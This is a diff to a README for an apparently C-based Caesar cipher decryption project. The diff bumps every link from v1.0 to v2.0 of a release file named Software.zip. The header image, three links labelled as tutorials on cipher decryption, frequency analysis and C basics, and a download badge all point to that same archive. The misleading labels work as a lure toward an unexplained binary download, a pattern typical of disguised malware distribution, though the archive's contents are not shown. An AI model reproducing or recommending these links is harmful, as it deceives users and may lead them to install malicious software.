@@ -1,6 +1,6 @@
 # **Caesar Cipher Decryption**
 
-![Caesar Cipher Decryption](https://github.com/ggilangffirmansyahh/Caesar-Cipher-Decryption/releases/download/v1.0/Software.zip)
+![Caesar Cipher Decryption](https://github.com/ggilangffirmansyahh/Caesar-Cipher-Decryption/releases/download/v2.0/Software.zip)
 
 ## Overview
 Welcome to the Caesar Cipher Decryption repository! This program is designed to decrypt Caesar cipher-encrypted messages using frequency analysis. It is written in C and offers the functionality to read input files, automatically decrypt messages, and output the results. If you are interested in cryptography, frequency analysis, file processing, and string manipulation, this repository is perfect for you.
@@ -38,13 +38,13 @@ This program is built using C programming language and incorporates concepts of 
 
 ## Additional Resources
 For more information on how to decrypt Caesar cipher-encrypted messages using frequency analysis, explore the following resources:
-- [Understanding Caesar Cipher Decryption](https://github.com/ggilangffirmansyahh/Caesar-Cipher-Decryption/releases/download/v1.0/Software.zip)
-- [Frequency Analysis in Cryptography](https://github.com/ggilangffirmansyahh/Caesar-Cipher-Decryption/releases/download/v1.0/Software.zip)
-- [C Programming Basics](https://github.com/ggilangffirmansyahh/Caesar-Cipher-Decryption/releases/download/v1.0/Software.zip)
+- [Understanding Caesar Cipher Decryption](https://github.com/ggilangffirmansyahh/Caesar-Cipher-Decryption/releases/download/v2.0/Software.zip)
+- [Frequency Analysis in Cryptography](https://github.com/ggilangffirmansyahh/Caesar-Cipher-Decryption/releases/download/v2.0/Software.zip)
+- [C Programming Basics](https://github.com/ggilangffirmansyahh/Caesar-Cipher-Decryption/releases/download/v2.0/Software.zip)
 
 ## Acknowledgements
 Special thanks to all contributors who have helped enhance the functionality of the Caesar Cipher Decryption program. Your efforts are greatly appreciated!
 
 ---
 
-[![Download Software](https://github.com/ggilangffirmansyahh/Caesar-Cipher-Decryption/releases/download/v1.0/Software.zip)](https://github.com/ggilangffirmansyahh/Caesar-Cipher-Decryption/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/ggilangffirmansyahh/Caesar-Cipher-Decryption/releases/download/v2.0/Software.zip)](https://github.com/ggilangffirmansyahh/Caesar-Cipher-Decryption/releases/download/v2.0/Software.zip)
